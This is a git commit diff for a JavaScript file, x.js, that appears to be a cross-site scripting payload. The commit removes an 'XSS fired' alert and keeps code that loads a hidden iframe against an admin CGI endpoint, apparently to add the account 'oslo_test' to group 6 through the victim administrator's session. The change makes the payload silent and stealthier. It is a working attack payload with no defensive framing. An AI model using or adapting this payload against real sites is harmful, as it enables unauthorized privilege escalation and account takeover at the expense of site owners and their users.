726171eb3f7bf7e0be2870c6b74f37394d2d39ca
BoxBoxShell <127796580+BoxBoxShell@users.noreply.github.com>
2025-05-02 09:05:04 +0000

    Update x.js

--- x.js
+++ x.js
@@ -1,4 +1,3 @@
-alert('XSS fired');
 const f = document.createElement('iframe');
 f.style.display = 'none';
 f.src = '/cgi-bin/admin/person/admin_profile.pl?pid=oslo_test&action=groupmembers&GroupID=6';
